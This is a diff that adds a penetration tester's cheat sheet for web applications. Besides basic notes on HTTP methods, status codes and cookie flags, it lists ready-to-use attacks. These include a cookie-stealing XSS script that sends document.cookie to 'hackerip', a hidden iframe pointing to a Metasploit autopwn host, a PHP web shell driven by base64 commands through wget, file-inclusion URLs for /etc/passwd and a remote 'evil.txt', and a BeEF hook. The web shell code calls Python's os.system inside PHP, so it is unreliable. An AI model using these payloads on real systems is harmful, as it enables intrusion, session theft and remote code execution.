@@ -1,0 +1,160 @@
+Web Apps
+
+
+# Request Methods
+
+GET  Passes all query material in the URL query string.
+POST Passes all requested data in the HTTP request body.
+------------------------------------------------------------------------------------------------------
+
+# Common Response Status Codes
+
+1xx  Informational
+100  Continue
+
+2xx  Success
+200  OK
+
+3xx  Redirection
+301  Moved Permanently
+302  Found
+
+4xx  Client Error
+401  Unauthorized
+403  Forbidden
+404  Not Found
+408  Request Timeout
+
+5xx  Server Error
+500  Internal Server Error
+------------------------------------------------------------------------------------------------------
+
+# Cookies
+
+Secure - only send over encrypted channel
+HttpOnly - prevents JavaScript from accessing the cookie
+------------------------------------------------------------------------------------------------------
+
+# Apache version, eTag, HTTP Basic Authentication Enabled
+
+telnet <target IP> 80
+HEAD / HTTP/1.0
+(hit enter 2x)
+
+for i in `cat 80.txt` ; do curl -iskXHEAD http://$i/ > $i 2>&1 ; echo Scanned $i ; done
+------------------------------------------------------------------------------------------------------
+
+# Browser Redirection
+
+<iframe SRC="http://hackerip/report" height = "0" width ="0">
+hacker:  use Metasploit browser autopwn listening on hackerip
+------------------------------------------------------------------------------------------------------
+
+# Cisco Router
+
+x is between 15 and 99.
+https://targetIP/level/x/exec/-/show
+------------------------------------------------------------------------------------------------------
+
+# Cookie Security Issues - missing HttpOnly or Secure attribute
+
+Firefox
+Cookies > View Cookie Information
+HttpOnly cookie tells the browser if a Java scripts tries to access the cookie, the browser should not return a value.
+
+for i in `cat 80.txt` ; do curl -iskXHEAD http://$i/ > $i 2>&1 ; echo Scanned $i ; done
+------------------------------------------------------------------------------------------------------
+
+# Cookie Stealing
+
+<script>new Image().src="http://hackerip/woot.php?"+ document.cookie;</script>
+hacker:  nc -lvp 80
+------------------------------------------------------------------------------------------------------
+
+# File upload vuln 
+
+Create a php file called evil.php 
+<?php
+$cmd=$_GET["cmd"];
+$decode=base64_decode($cmd);
+os.system($decode);
+?>
+
+Once the malicious file is in place, pass base64 encoded commands to it, and get basic code execution on the web server, as the “apache” user.
+
+wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo id|base64)
+cat output
+
+wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo ifconfig|base64)
+cat output
+------------------------------------------------------------------------------------------------------
+
+# Fuzzing
+
+When fuzzing headers, disable URL Encode.
+When you are inside of a POST parameter, always use URL encoding.
+------------------------------------------------------------------------------------------------------
+
+# Local file inclusion
+
+http://localhost/index.php?page=/etc/passwd
+------------------------------------------------------------------------------------------------------
+
+# PHP version
+
+telnet <target IP> 80
+GET / HEAD/1.0
+
+http://target IP/aaaaa.php
+
+Firefox > Web Developer Toolbar > Information > View Response Headers
+------------------------------------------------------------------------------------------------------
+
+# Remote file inclusion
+
+http://localhost/index.php?page=http://attackersHost/evil.txt
+------------------------------------------------------------------------------------------------------
+
+# TRACE / TRACK methods allowed
+
+telnet <target IP> 80
+OPTIONS / HTTP/1.0
+(hit enter 2x)
+------------------------------------------------------------------------------------------------------
+
+# WebDAV extensions are enabled
+
+msfconsole
+use auxiliary/scanner/http/webdav_scanner
+
+./davtest.pl -url http://target-IP
+
+for i in $(cat 80.txt); do cadaver -t $i; done
+------------------------------------------------------------------------------------------------------
+
+# WordPress XSS vuln
+
+wpscan.rb - -url www.target.com - -enumerate p
+------------------------------------------------------------------------------------------------------
+
+# XML Injection
+
+Single quote         foo'
+Double quote         foo”
+Greater than         foo>
+Less than            foo<			
+Comment tag          foo<!--
+Ampersand            &foo
+------------------------------------------------------------------------------------------------------
+
+# XSS
+
+http://target.com/index.php?user=<script>alert(1)</script>
+http://target.com/index.php?user=<script>alert("Test XSS")alert</script>
+
+curl https://target.com/login.php?user=`perl –e 'print "a" x 500'`
+
+<iframe height=”0″ width=”0″ src=<BeEF_hook></iframe>
+
+<script>alert(document.cookie)</script>
+<script>var img = new Image(); img.src=“http://127.0.0.1:8000/?cookie=“+document.cookie;</script>
